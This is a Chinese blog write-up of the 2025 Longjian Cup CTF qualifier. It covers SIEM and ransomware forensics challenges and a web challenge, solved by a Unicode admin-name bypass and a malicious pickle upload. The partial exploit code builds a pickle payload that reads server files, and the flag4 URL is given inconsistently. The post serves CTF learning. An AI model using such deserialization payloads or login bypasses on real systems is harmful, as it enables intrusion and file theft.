---
title: 2025第三届“陇剑杯”网络安全大赛初赛-夺旗闯关赛wp - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/19089665
source: 博客园 - 渗透测试中心
date: 2025-09-14
fetch_date: 2025-10-02T20:09:07.369304
---

# 2025第三届“陇剑杯”网络安全大赛初赛-夺旗闯关赛wp - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [2025第三届“陇剑杯”网络安全大赛初赛-夺旗闯关赛wp](https://www.cnblogs.com/backlion/p/19089665 "发布于 2025-09-13 21:10")

### 应急

#### 应急响应siem

百度网盘：

通过网盘分享的文件：siem-加密.rar

链接: https://pan.baidu.com/s/1wtfdSY2hThOAzVRGr9jwcg 提取码: e86t

解压密码：x2p1nsWFG4KfXp5BXegb

题目描述：

题目描述在比赛过程中变了一次，具体如下：

初始：

某企业内网被攻破了，请分析出问题并给出正确的flag

flag1:攻击者的ip是什么

flag2:在攻击时间段一共有多少个终端会话登录成功

flag3:攻击者遗留的后门系统用户是什么

flag4:提交攻击者试图用命令行请求网页的完整url地址

flag5:提交wazuh记录攻击者针对域进行哈希传递攻击时被记录的事件ID

flag6:提交攻击者对域攻击所使用的工具

flag7:提交攻击者删除DC桌面上的文件名

flag格式：flag{md5(flag1-flag2-flag3-...-flag6-flag7)}

虚拟机系统密码：wazuh-user/wazuh

Web地址：http://IP:80 账号密码admin/admin

第一次变化

变化后忘记保存了，反正flag6和flag7变了。说flag6工具不需要后缀，flag7删除的文件名需要后缀

flag1:攻击者的ip是什么

先开机，使用给出的密码登录系统，使用sudo su切换到root用户，查看当前虚拟机的IP地址：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210908257-906298483.png)

测试发现80端口没有开放，实际需要访问https://IP:443才能打开web页面

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210909266-347964535.png)

打开发现三台主机

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210910109-1538175831.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210910860-909688279.png)

根据正常渗透测试流程，是通过app打进来，然后通过pc控制域控，所以这里我们先看app的日志。

点这里把日志时间拉长到一年：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210911642-403936332.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210912415-303138952.png)

这个系统没用过，那就一个个点，点下面的标签可以查看到攻击的信息

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210913182-99372845.png)

可以看到app有大量登录失败的记录：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210913890-495356093.png)

猜测app是被爆破登录的，点击下图所示位置可以查看详细信息：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210914636-1595899679.png)

观察几页日志发现大量SSH登录失败日志：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210915438-858228198.png)

查看得到攻击者IP：192.168.41.143

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210916321-461688854.png)

flag2:在攻击时间段一共有多少个终端会话登录成功

上面就已经可以看到是13次

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210917106-1057488033.png)

flag3:攻击者遗留的后门系统用户是什么

查看日志发现有添加用户的行为

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210917776-368203961.png)

查看得到用户名hacker

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210918600-2061792039.png)

flag4:提交攻击者试图用命令行请求网页的完整url地址

命令行请求网页一般是使用curl,直接搜索curl,可以看到有两个日志，但是另外一个日志是本机发起的，所以可以确定完整的url是由黑客攻击发起的那个。https://192.168.41.146/.back.php?pass=id

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210919420-40703552.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210920215-1051189429.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210920998-1203440657.png)

flag5:提交wazuh记录攻击者针对域进行哈希传递攻击时被记录的事件ID

查看pc日志，筛选Possible Pass the hash attack

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210921756-456281985.png)

flag6:提交攻击者对域攻击所使用的工具

查到有mimikatz创建

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210922639-1720322094.png)

flag7:提交攻击者删除DC桌面上的文件名

直接查看dc的日志，筛选文件删除的日志

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210923365-2092541985.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210924085-723073512.png)

直接就能看到删除桌面的文件名

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210924888-291106504.png)

结果

192.168.41.143-13-hacker-http://192.168.41.136/.back.php?pass=id-1734511987.34749419-mimikatz-ossec.conf flag{3bfc26f5d9f932ccf73f356019585edf}

#### 勒索软件入侵响应

.攻击者ip地址
2.攻击者的webshell文件名
3.攻击者的恶意软件文件名
4.恢复flag.encrypt中的指定内容

5.提交flag格式为：flag{攻击者ip地址-攻击者修改webshell文件名-攻击者的恶意软件文件名-恢复flag.encrypt中的指定内容}

将勒索镜像导入lovelymemluex

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210925606-1432344098.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210926348-229614624.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210927062-1702649768.png)

看定时任务/etc/crontab

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210927702-2079294061.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210928440-48029819.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210929133-1562737740.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210930010-311400841.png)

通过RS导入镜像-使用flag.encrypt解密

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210930734-626282532.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210931664-941053433.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210932662-1523136814.png)

```
flag{192.168.85.128-error.php-U98ab8a1-0cc91e6dad77}
```

### **web**

**forge**

**题目考点**

• 考点1：unicode替代字符，绕过admin登录

• 考点2：文件上传

**解题思路**

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210933442-1140104663.png)

看到登录框看看怎么绕过，注册发现只能用admin登录，但是不能用admin当做用户名，所以想到用unicode替换admin为admin去注册

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210934023-1642762656.png)

但是想到只能用admin用户名登录，但是用密码用注册时设置的密码，顺利登录界面

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210934586-299516407.png)

点开upload model 看到文件上传类型，然后旁边还有示例的文件，

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210935131-1668058664.png)

看到是.pkl文件，我们就可以用ai跑出一个代码去生成文件然后上

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210935722-1838627887.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913210936345-297068547.png)

exp:

import pickle

定义CHIKAWA类，初始化方法无额外业务逻辑

class CHIKAWA:

    def \_\_init\_\_(self):

        pass

1. 创建CHIKAWA类实例

chikawa\_instance = CHIKAWA()

2. 为实例添加指定属性及值

chikawa\_instance.model\_name = "JKL0x3e"

chikawa\_instance.data = b'c\_\_builtin\_\_\ngetattr\np0\n(cpathlib\nPath\np1\nVread\_text\np2\ntp3\nRp4\n(cpathlib\nPosixPath\np5\n...